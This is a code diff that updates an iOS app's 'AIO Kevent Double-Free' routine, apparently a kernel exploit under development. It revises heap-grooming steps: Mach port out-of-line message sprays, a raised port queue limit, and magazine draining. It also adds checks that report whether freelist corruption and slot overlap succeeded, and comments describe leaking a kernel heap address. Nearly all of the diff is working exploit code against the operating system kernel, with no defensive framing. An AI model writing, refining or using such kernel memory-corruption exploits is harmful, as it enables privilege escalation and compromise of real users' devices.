@@ -5658,16 +5658,16 @@ static void *aio_free_and_reclaim_racer(void *arg) {
 // Confirms ext[1] control via reclaim aio_nbytes (distinct marker).
 // Leaks kernel heap address via kevent64 ident field.
 
-static atomic_bool _aioUafRunning = ATOMIC_VAR_INIT(false);
+static volatile int32_t _aioUafRunning = 0;
+#import <libkern/OSAtomic.h>
 
 - (void)aioUafTapped {
-    bool expected = false;
-    if (!atomic_compare_exchange_strong(&_aioUafRunning, &expected, true)) {
+    if (!OSAtomicCompareAndSwap32Barrier(0, 1, &_aioUafRunning)) {
         [self appendLog:@"⚠ Already running — ignoring tap"];
         return;
     }
 
-    [self appendLog:@"\n========== AIO Kevent Double-Free v4 =========="];
+    [self appendLog:[NSString stringWithFormat:@"\n========== AIO Kevent Double-Free v5 [tid=%llu] ==========", (uint64_t)pthread_mach_thread_np(pthread_self())]];
 
     // Disable button to prevent double-tap
     dispatch_async(dispatch_get_main_queue(), ^{
@@ -5684,7 +5684,7 @@ static atomic_bool _aioUafRunning = ATOMIC_VAR_INIT(false);
     int fd = open(path.UTF8String, O_CREAT | O_RDWR | O_TRUNC, 0644);
     if (fd < 0) {
         [self appendLog:@"FAIL: could not create temp file"];
-        atomic_store(&_aioUafRunning, false);
+        OSAtomicCompareAndSwap32Barrier(1, 0, &_aioUafRunning);
         dispatch_async(dispatch_get_main_queue(), ^{
             self.aioUafButton.enabled = YES;
             [self.aioUafButton setTitle:@"AIO Kevent Double-Free" forState:UIControlStateNormal];
@@ -5852,7 +5852,7 @@ static atomic_bool _aioUafRunning = ATOMIC_VAR_INIT(false);
 
     [self appendLog:@"\n--- Phase D: Magazine drain + OOL overlap ---"];
 
-    // Create spray ports to hold OOL data in kernel (kalloc.256 per message)
+    // Create spray ports with queue limit=10 so 5 drain + 1 overlap = 6 msgs fit
     enum { kDrainPorts = 5, kDrainMsgsPerPort = 5, kDrainTotal = kDrainPorts * kDrainMsgsPerPort };
     mach_port_t drainPorts[kDrainPorts];
     int drainPortsReady = 0;
@@ -5860,6 +5860,8 @@ static atomic_bool _aioUafRunning = ATOMIC_VAR_INIT(false);
         drainPorts[p] = MACH_PORT_NULL;
         if (mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &drainPorts[p]) == KERN_SUCCESS) {
             mach_port_insert_right(mach_task_self_, drainPorts[p], drainPorts[p], MACH_MSG_TYPE_MAKE_SEND);
+            // Increase queue limit from default 5 to 10
+            mach_port_set_qlimit(mach_task_self_, drainPorts[p], MACH_PORT_QLIMIT_DEFAULT, 10);
             drainPortsReady++;
         }
     }
@@ -5924,18 +5926,8 @@ static atomic_bool _aioUafRunning = ATOMIC_VAR_INIT(false);
         [self appendLog:[NSString stringWithFormat:@"  E1 aio_read: %@", e1ok ? @"OK" : @"FAIL"]];
 
         if (e1ok && drainPayload && drainPortsReady > 0) {
-            [self appendLog:@"  D: draining 1 msg from port queue..."];
-            // Drain ONE message first to make room in port queue (limit=5).
-            // Without this, mach_msg(SEND) below blocks forever.
-            {
-                DrainMsg drPre;
-                kern_return_t kr = mach_msg(&drPre.header, MACH_RCV_MSG, 0, sizeof(DrainMsg),
-                         drainPorts[0], 0, MACH_PORT_NULL);
-                [self appendLog:[NSString stringWithFormat:@"  D: drain-pre kr=%d", kr]];
-            }
-
-            // Spray one more OOL on same CPU → should get same slot as E1
-            [self appendLog:@"  D: sending overlap OOL..."];
+            // Queue limit raised to 10 → 5 drain + 1 overlap = 6 msgs fit without draining
+            [self appendLog:@"  D: sending overlap OOL (qlimit=10, no pre-drain needed)..."];
             DrainMsg overlapMsg;
             memset(&overlapMsg, 0, sizeof(overlapMsg));
             overlapMsg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
@@ -5951,29 +5943,24 @@ static atomic_bool _aioUafRunning = ATOMIC_VAR_INIT(false);
             kern_return_t okr = mach_msg(&overlapMsg.header, MACH_SEND_MSG, sizeof(overlapMsg),
                      0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
             [self appendLog:[NSString stringWithFormat:@"  D: overlap send kr=%d", okr]];
-            // Drain the overlap message
-            [self appendLog:@"  D: draining overlap msg..."];
-            {
-                DrainMsg drOvl;
-                kern_return_t kr2 = mach_msg(&drOvl.header, MACH_RCV_MSG, 0, sizeof(DrainMsg),
-                         drainPorts[0], 0, MACH_PORT_NULL);
-                [self appendLog:[NSString stringWithFormat:@"  D: drain-overlap kr=%d", kr2]];
-            }
 
             [self appendLog:@"  D: checking E1 state..."];
             while (aio_error(&e1) == EINPROGRESS) usleep(100);
             int e1state = aio_error(&e1);
-            [self appendLog:[NSString stringWithFormat:@"  E1 aio_error=%d (0=done, %d=EINVAL)", e1state, EINVAL]];
+            [self appendLog:[NSString stringWithFormat:@"  E1 aio_error=%d (0=done, %d=EINVAL, %d=EFAULT)", e1state, EINVAL, EFAULT]];
 
             if (e1state == EINVAL) {
                 [self appendLog:@"  *** OVERLAP CONFIRMED: OOL overwrote E1's slot ***"];
                 [self appendLog:@"  *** Freelist corruption active — overlapping alloc works ***"];
+            } else if (e1state == EFAULT) {
+                [self appendLog:@"  *** E1 EFAULT — OOL corrupted E1's buf/fd fields ***"];
+                [self appendLog:@"  *** Overlap likely occurring but corrupting wrong offset ***"];
             } else if (e1state == 0) {
                 [self appendLog:@"  E1 valid — OOL did not hit same slot (magazine drain insufficient)"];
                 aio_return(&e1);
             } else {
                 [self appendLog:[NSString stringWithFormat:@"  E1 unexpected state: %d", e1state]];
-                if (e1state != EINVAL) aio_return(&e1);
+                if (e1state != EINVAL && e1state != EFAULT) aio_return(&e1);
             }
         } else {
             [self appendLog:[NSString stringWithFormat:@"  D: SKIP — e1ok=%d payload=%p ports=%d", e1ok, drainPayload, drainPortsReady]];
@@ -5996,7 +5983,7 @@ static atomic_bool _aioUafRunning = ATOMIC_VAR_INIT(false);
     unlink(path.UTF8String);
     [self appendLog:[NSString stringWithFormat:@"=== uid=%d gid=%d ===", getuid(), getgid()]];
     [self appendLog:@"========== AIO Kevent Double-Free Complete =========="];
-            atomic_store(&_aioUafRunning, false);
+            OSAtomicCompareAndSwap32Barrier(1, 0, &_aioUafRunning);
             dispatch_async(dispatch_get_main_queue(), ^{
                 self.aioUafButton.enabled = YES;
                 [self.aioUafButton setTitle:@"AIO Kevent Double-Free" forState:UIControlStateNormal];
